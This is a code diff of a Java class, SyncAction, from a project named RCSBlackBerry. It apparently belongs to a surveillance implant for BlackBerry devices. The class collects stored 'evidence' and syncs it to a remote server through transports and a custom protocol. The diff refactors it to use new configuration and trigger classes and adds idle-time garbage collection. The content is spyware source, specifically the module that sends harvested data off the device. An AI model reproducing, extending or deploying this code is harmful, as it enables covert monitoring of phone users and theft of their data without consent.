@@ -6,51 +6,53 @@
  * 
  * Project      : RCS, RCSBlackBerry
  * *************************************************/
-	
+
 package blackberry.action.sync;
 
 import java.util.Vector;
 
+import net.rim.device.api.crypto.RandomSource;
 import net.rim.device.api.system.Backlight;
-import blackberry.AgentManager;
-import blackberry.action.SubAction;
+import net.rim.device.api.system.DeviceInfo;
+import blackberry.Status;
+import blackberry.Trigger;
+import blackberry.action.SubActionMain;
 import blackberry.action.sync.protocol.ProtocolException;
 import blackberry.action.sync.protocol.ZProtocol;
 import blackberry.action.sync.transport.Transport;
-import blackberry.agent.Agent;
+import blackberry.config.ConfAction;
 import blackberry.debug.Check;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
-import blackberry.event.Event;
 import blackberry.evidence.Evidence;
 import blackberry.evidence.EvidenceCollector;
+import blackberry.manager.ModuleManager;
 
-public abstract class SyncAction extends SubAction {
+public abstract class SyncAction extends SubActionMain {
+    //#ifdef DEBUG
+    private static Debug debug = new Debug("SyncAction", DebugLevel.VERBOSE);
+    //#endif
     protected EvidenceCollector logCollector;
-    protected AgentManager agentManager;
+    protected ModuleManager agentManager;
     // protected Transport[] transports = new Transport[Transport.NUM];
     protected Vector transports;
     protected Protocol protocol;
 
     protected boolean initialized;
 
-    //#ifdef DEBUG
-    private static Debug debug = new Debug("SyncAction", DebugLevel.VERBOSE);
-    //#endif
-
-    public SyncAction(int actionId, final byte[] confParams) {
-        super(actionId);
+    public SyncAction(ConfAction conf) {
+        super(conf);
 
         logCollector = EvidenceCollector.getInstance();
-        agentManager = AgentManager.getInstance();
+        agentManager = ModuleManager.getInstance();
         transports = new Vector();
 
         protocol = new ZProtocol();
-        initialized = parse(confParams);
+        initialized = parse(conf);
         initialized &= initTransport();
     }
 
-    public boolean execute(Event event) {
+    public boolean execute(Trigger trigger) {
         //#ifdef DBC
         Check.requires(protocol != null, "execute: null protocol");
         Check.requires(transports != null, "execute: null transports");
@@ -76,10 +78,14 @@ public abstract class SyncAction extends SubAction {
         }
         //#endif
 
-        wantReload = false;
-        wantUninstall = false;
+        if (DeviceInfo.getIdleTime() > 600 && RandomSource.getInt(10) == 0) {
+            //#ifdef DEBUG
+            debug.trace("execute garbage collector");
+            //debug.traceMemory();
+            //#endif        
 
-        agentManager.reStart(Agent.AGENT_DEVICE);
+            System.gc();
+        }
 
         boolean ret = false;
 
@@ -96,21 +102,20 @@ public abstract class SyncAction extends SubAction {
                 debug.trace("execute: transport available");
                 //#endif
                 protocol.init(transport);
-                
+
                 try {
-                    //#ifdef DEMO
-                    Debug.ledFlash(Debug.COLOR_YELLOW);
-                    //#endif
+                    if (Status.self().wantLight()) {
+                        Debug.ledFlash(Debug.COLOR_YELLOW);
+                    }
 
                     ret = protocol.perform();
-                    wantUninstall = protocol.uninstall;
-                    wantReload = protocol.reload;
+
                 } catch (ProtocolException e) {
                     //#ifdef DEBUG
                     debug.error(e);
                     //#endif
                     ret = false;
-                } 
+                }
                 //#ifdef DEBUG
                 debug.trace("execute protocol: " + ret);
                 //#endif
@@ -125,6 +130,7 @@ public abstract class SyncAction extends SubAction {
                 //#ifdef DEBUG
                 debug.info("SyncAction OK");
                 Evidence.info("Synced with url:" + transport.getUrl());
+                debug.traceMemory();
                 //#endif
 
                 status.synced = true;
@@ -139,8 +145,6 @@ public abstract class SyncAction extends SubAction {
 
         return false;
     }
-
-    protected abstract boolean parse(final byte[] confParams);
 
     protected abstract boolean initTransport();
 
